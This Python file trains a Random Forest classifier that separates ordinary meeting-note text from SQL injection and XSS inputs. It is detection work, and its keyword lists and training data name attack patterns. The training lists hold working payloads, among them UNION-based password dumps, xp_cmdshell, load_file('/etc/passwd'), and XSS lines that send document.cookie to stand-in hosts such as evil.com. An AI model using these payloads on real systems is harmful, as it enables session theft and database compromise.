"""
brain.py — AI Security Engine
Random Forest classifier for detecting SQLi and XSS payloads
via feature extraction rather than simple keyword matching.
"""

import re
import numpy as np
from sklearn.ensemble import RandomForestClassifier


# ---------------------------------------------------------------------------
# Feature extraction
# ---------------------------------------------------------------------------

_SPECIAL_CHARS = set("'\"<>;()=/\\")

SQL_KEYWORDS = [
    "select", "union", "insert", "update", "delete", "drop", "create",
    "alter", "exec", "execute", "from", "where", "having", "group by",
    "order by", "limit", "offset", "xp_", "sp_", "information_schema",
    "sysobjects", "syscolumns", "sleep", "benchmark", "load_file",
    "into outfile", "concat", "char(", "ascii(", "substring(",
    " or ", " and ", "or '", "or 1", "and 1", "1=1", "1 =1", "waitfor",
]

XSS_KEYWORDS = [
    "script", "onerror", "onload", "onclick", "onmouseover", "onfocus",
    "onblur", "alert", "eval", "document", "window", "location", "cookie",
    "javascript", "vbscript", "expression", "iframe", "object", "embed",
    "svg", "math", "xml", "data:", "base64",
]


def extract_features(text: str) -> list:
    """
    Return a fixed-length numeric feature vector for the given input string.

    Features:
      0  raw character length
      1  special-char density  (' " < > ; ( ) = / \\)
      2  quote density         (' and ")
      3  angle-bracket density (< and >)
      4  SQL keyword hit count (normalised by length)
      5  XSS keyword hit count (normalised by length)
      6  binary — contains <script
      7  binary — contains SQL comment (-- or /*)
      8  binary — contains percent-encoded sequence (%XX)
      9  binary — contains hex literal (0x…)
      10 binary — classic equality injection pattern (or 1=1, '='')
      11 ratio of uppercase letters (SQLi often uses caps)
      12 digit density
    """
    if not text:
        return [0] * 13

    lower = text.lower()
    length = max(len(text), 1)

    special_count = sum(1 for c in text if c in _SPECIAL_CHARS)
    quote_count = text.count("'") + text.count('"')
    angle_count = text.count("<") + text.count(">")

    sql_hits = sum(lower.count(kw) for kw in SQL_KEYWORDS)
    xss_hits = sum(lower.count(kw) for kw in XSS_KEYWORDS)

    has_script = int("<script" in lower)
    has_sql_comment = int("--" in text or "/*" in text)
    has_url_encode = int(bool(re.search(r"%[0-9a-fA-F]{2}", text)))
    has_hex = int(bool(re.search(r"0x[0-9a-fA-F]+", lower)))
    has_eq_inject = int(bool(re.search(
        r"['\"]?\s*(or|and)\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+",
        lower
    )))

    upper_ratio = sum(1 for c in text if c.isupper()) / length
    digit_density = sum(1 for c in text if c.isdigit()) / length

    return [
        length,
        special_count / length,
        quote_count / length,
        angle_count / length,
        sql_hits / length,
        xss_hits / length,
        has_script,
        has_sql_comment,
        has_url_encode,
        has_hex,
        has_eq_inject,
        upper_ratio,
        digit_density,
    ]


# ---------------------------------------------------------------------------
# Training data
# ---------------------------------------------------------------------------

BENIGN = [
    "Q4 budget review with the finance and ops teams",
    "Mariam will prepare the quarterly report by Friday afternoon",
    "We agreed to push the deadline to next Monday morning",
    "Fatima presented the updated HR onboarding policies",
    "The board approved an annual budget of 2.5 million rials",
    "Remote work policy will be revised next quarter pending HR approval",
    "Engineering reviewed the new microservices architecture",
    "Product launch is scheduled for March 15th — all teams aligned",
    "Customer feedback was analyzed; key themes documented for roadmap",
    "Training sessions begin next Tuesday across all regional offices",
    "The new Muscat office location has been finalized and lease signed",
    "Revenue targets set at 15 percent growth year over year",
    "IT completed the annual security audit with no critical findings",
    "Six new hires will join the platform team starting Monday",
    "Project timeline extended by two weeks due to vendor delays",
    "Marketing campaign launched successfully across social channels",
    "Annual performance reviews are scheduled for mid-December",
    "Contract with Al-Nahda Group signed; kickoff call next week",
    "Ahmed will lead the new mobile development pod starting February",
    "Cloud infrastructure budget approved; migration begins Q2",
    "The quarterly OKRs have been met across all business units",
    "New vendor contracts under legal review; expected by end of month",
    "Team building event planned for the last Friday of the month",
    "Design team presented three mockups for the redesigned portal",
    "Risk assessment for the new payment gateway completed successfully",
    "Notes from today: discussed sprint velocity and upcoming demo",
    "Follow-up items: Khalid to share slides, Noura to book conference room",
    "Action item: schedule a follow-up call with the Dubai office",
    "The pilot program showed a 20 percent improvement in onboarding time",
    "We need to revisit the pricing model before the investor deck is ready",
]

SQLI = [
    "' OR '1'='1",
    "'; DROP TABLE meetings; --",
    "' UNION SELECT username, password FROM users --",
    "admin'--",
    "' OR 1=1--",
    "1; SELECT * FROM information_schema.tables",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1' AND 1=1 UNION SELECT 1,2,3 --",
    "' OR 'x'='x",
    "'; EXEC xp_cmdshell('dir'); --",
    "1 AND 1=1",
    "' AND SLEEP(5)--",
    "admin'/*",
    "1 UNION SELECT user(),version(),database()",
    "' AND 1=2 UNION SELECT 1,concat(username,0x3a,password),3 FROM users--",
    "1; INSERT INTO users VALUES ('hacker','p@ss') --",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
    "'; UPDATE users SET password='owned' WHERE '1'='1",
    "1 AND (SELECT COUNT(*) FROM users) > 0--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "1 ORDER BY 3--",
    "' GROUP BY columnnames having 1=1--",
    "' HAVING 1=1--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT load_file('/etc/passwd')--",
    "' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "0x27 OR 0x31=0x31",
    "'; SELECT CHAR(0x41,0x42)--",
    "%27 OR %271%27=%271",
    "1' OR '1' LIKE '1",
]

XSS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert('xss')",
    "<svg onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "'><script>alert(document.cookie)</script>",
    "<iframe src='javascript:alert(1)'>",
    "<img src='x' onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
    "onmouseover=alert(1)",
    "<script>document.location='http://evil.com?c='+document.cookie</script>",
    "<a href='javascript:void(0)' onclick='alert(1)'>click me</a>",
    "expression(alert('XSS'))",
    "<META HTTP-EQUIV='refresh' CONTENT='0;url=javascript:alert(1);'>",
    "vbscript:msgbox(1)",
    "<input value='><script>alert(1)</script>'>",
    "';alert(1)//",
    "<script>window.location='http://attacker.example.com'</script>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "<img src=1 onerror=\"javascript:alert(1)\">",
    "<div onmouseover='alert(document.cookie)'>hover</div>",
    "<object data='javascript:alert(1)'>",
    "<embed src='javascript:alert(1)'>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')>",
    "<script>fetch('https://evil.example.com/?'+document.cookie)</script>",
    "<svg><script>alert&#40;1&#41;</script>",
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
    "data:text/html,<script>alert(0)</script>",
    "<base href='javascript:alert(1)'><a href=' '>click</a>",
    "<link rel='stylesheet' href='javascript:alert(1)'>",
]


# ---------------------------------------------------------------------------
# Classifier
# ---------------------------------------------------------------------------

class SecurityBrain:
    """
    Wraps a trained RandomForestClassifier that distinguishes safe input
    from SQLi / XSS payloads using numeric feature vectors.
    """

    def __init__(self):
        self._clf = RandomForestClassifier(
            n_estimators=200,
            max_depth=None,
            min_samples_split=2,
            random_state=42,
            class_weight="balanced",
        )
        self._train()

    # ------------------------------------------------------------------
    def _train(self):
        feature_matrix, labels = [], []
        for sample in BENIGN:
            feature_matrix.append(extract_features(sample))
            labels.append(0)
        for sample in SQLI:
            feature_matrix.append(extract_features(sample))
            labels.append(1)
        for sample in XSS:
            feature_matrix.append(extract_features(sample))
            labels.append(1)
        self._clf.fit(np.array(feature_matrix), np.array(labels))

    # ------------------------------------------------------------------
    def classify(self, text: str) -> tuple[int, float]:
        """
        Returns (label, confidence).
          label = 1  → malicious
          label = 0  → benign
        """
        features = np.array([extract_features(text)])
        label = int(self._clf.predict(features)[0])
        proba = float(max(self._clf.predict_proba(features)[0]))
        return label, proba

    # ------------------------------------------------------------------
    def attack_type(self, text: str) -> str:
        """Best-effort classification of the attack family."""
        lower = text.lower()
        xss_score = sum(lower.count(k) for k in XSS_KEYWORDS)
        sql_score = sum(lower.count(k) for k in SQL_KEYWORDS)
        if xss_score > sql_score:
            return "XSS"
        return "SQLi"
